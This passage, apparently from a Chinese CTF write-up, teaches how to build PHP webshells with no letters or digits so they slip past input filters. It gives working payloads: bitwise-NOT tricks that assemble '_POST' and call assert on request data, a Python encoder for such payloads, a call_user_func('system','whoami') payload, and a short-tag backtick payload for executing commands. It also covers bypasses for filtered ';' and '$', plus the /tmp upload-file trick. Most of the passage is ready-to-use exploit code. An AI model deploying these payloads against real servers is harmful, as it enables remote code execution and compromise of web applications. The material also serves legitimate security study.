    $____ .= ~($__{$_});   //得到P，此时$____="_P"
    $__ = "小";
    $____ .= ~($__{$_});   //得到O，此时$____="_PO"
    $__ = "欠";
    $____ .= ~($__{$_});   //得到S，此时$____="_POS"
    $__ = "立";
    $____ .= ~($__{$_});   //得到T，此时$____="_POST"
    $_ = $$____;   //$_ = $_POST
    $___($_[_]);   //assert($_POST[_])
成功执行命令，不过由于相同的原因，我们需要对exp进行URL编码才能正常使用。  
这里还有一个需要注意的点是在PHP5下我们需要使用:
    $__ = "欠";
    $____ .= ~($__{$_});
这种写法而不能直接使用:
    $____ .= ~("欠"{$_});
后者是PHP7中的语法。
### 升级版
在上面的学习过程中，可以知道:
    $_="卢";
    print(~($_{1}));
    print(~"\x8d");
这两种写法其实是等价的。所以如果把EXP中的~("欠"{1})写成~"\x8d"这种形式，可以缩减不少字符。给出POC:
    def get(shell):
        hexbit=''.join(map(lambda x: hex(~(-(256-ord(x)))),shell))
        hexbit = hexbit.replace('0x','%')
        print(hexbit)
    get('assert')
    get('_POST')
利用这个POC，我把上面的EXP缩减为:
     "B"
    "B"++ ==> "C"
也就是说，如果我们能够得到"A"，那么我们就能通过自增自减，得到所有的字母。  
那么问题就转化为怎么得到一个字符"A"。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为"Array"。再取这个字符串的第一个字母，就可以获得"A"。
分析下这个Payload，?>闭合了eval自带的<?标签。接下来使用了短标签。{}包含的PHP代码可以被执行，~"%a0%b8%ba%ab"为"_GET"，通过反引号进行shell命令执行。最后我们只要GET传参%a0即可执行命令。  
## 过滤了;
分号我们只是用在结束PHP语句上，我们只要把所有的PHP语句改成短标签形式，就可以不使用;了。
## 过滤了$
过滤了$的影响是我们彻底不能构造变量了。
### PHP7
在PHP7中，我们可以使用($a)()这种方法来执行命令。这里我使用call_user_func()来举例(不使用assert()的原因上面已经解释过)。  
我构造了shell=(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,'');  
其中~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c是"call_user_func"，~%8c%86%8c%8b%9a%92是"system"，~%88%97%90%9e%92%96是"whoami"。  
成功执行命令  
### PHP5
PHP5中不再支持($a)()这种方法来调用函数。因此利用方法较为复杂。  
详细过程可以参考P神的[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list)(膜爆P神!!)  
我们首先要知道几个知识点:  
**1.** Linux下可以用 **.** 来执行文件  
**2.**
PHP中POST上传文件会把我们上传的文件暂时存在/tmp文件夹中，默认文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。(说句题外话，这个知识点在最近的CTF中频繁出镜，具体利用有如文件包含等)  